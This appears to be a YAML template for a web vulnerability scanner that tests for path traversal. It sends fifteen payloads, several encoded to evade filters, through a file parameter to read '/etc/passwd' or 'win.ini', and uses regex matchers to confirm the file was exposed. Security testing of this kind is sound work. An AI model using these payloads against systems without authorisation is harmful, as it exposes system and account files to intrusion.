id: generic-path-traversal
info:
  name: Path Traversal
  description: Tests for path traversal vulnerabilities allowing file system access
  owasp_category: A01:2021
  severity: high
  tags:
    - path-traversal
    - lfi
    - file-inclusion
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: GET
  parameter: "{{file_param}}"

  payloads:
    - "../../../etc/passwd"
    - "..\\..\\..\\..\\windows\\win.ini"
    - "....//....//....//etc/passwd"
    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    - "....\\/....\\/....\\/etc/passwd"
    - "..%252f..%252f..%252fetc/passwd"
    - "....%252f....%252f....%252fetc%252fpasswd"
    - "..%c0%af..%c0%af..%c0%afetc/passwd"
    - "..%5c..%5c..%5cwindows/win.ini"
    - "....\\\\....\\\\....\\\\windows\\\\win.ini"
    - "../../../../../../../../etc/passwd"
    - "..\\\\..\\\\..\\\\..\\\\windows\\\\win.ini"
    - "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    - "..%u2216..%u2216etc/passwd"
    - "..%c0%af../etc/passwd"

  matchers:
    - type: status
      condition: in
      status:
        - 200
        - 200
    - type: regex
      condition: or
      regex:
        - 'root:x:[0-9]+:[0-9]+:'
        - '\[drivers\]'
        - 'for 16-bit app support'
        - '/bin/bash'
        - '/bin/sh'
        - 'daemon:'
        - '; for 16-bit'
        - 'extensions'
        - 'font.*driver'
        - ':\[windows\]'
        - ':\[fonts\]'

  matchers_condition: and
